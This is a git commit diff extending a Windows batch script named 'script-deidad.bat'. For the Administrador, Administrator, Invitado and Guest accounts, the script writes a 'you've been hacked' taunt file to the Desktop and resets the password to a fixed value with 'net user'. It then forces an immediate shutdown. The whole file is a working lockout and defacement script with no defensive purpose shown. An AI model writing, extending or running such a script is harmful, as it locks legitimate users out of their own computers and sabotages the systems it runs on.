4f97880f8183ed031293a43f097ea02bd54f03ef
UkiMer <150144368+UkiMer@users.noreply.github.com>
2024-09-26 01:59:17 -0300

    Update script-deidad.bat

--- script-deidad.bat
+++ script-deidad.bat
@@ -1,8 +1,31 @@
 @echo off
+
 cd /d C:\
 cd Users
 cd Administrador
 cd Desktop
 echo Fuiste jakeadoooooo por los jesusitos > Jesupillos.txt
 net user Administrador Chao!3010
+
+cd /d C:\
+cd Users
+cd Administrator
+cd Desktop
+echo Fuiste jakeadoooooo por los jesusitos > Jesupillos.txt
+net user Administrator Chao!3010
+
+cd /d C:\
+cd Users
+cd Invitado
+cd Desktop
+echo Fuiste jakeadoooooo por los jesusitos > Jesupillos.txt
+net user Invitado Chao!3010
+
+cd /d C:\
+cd Users
+cd Guest
+cd Desktop
+echo Fuiste jakeadoooooo por los jesusitos > Jesupillos.txt
+net user Guest Chao!3010
+
 shutdown /s /f /t 0
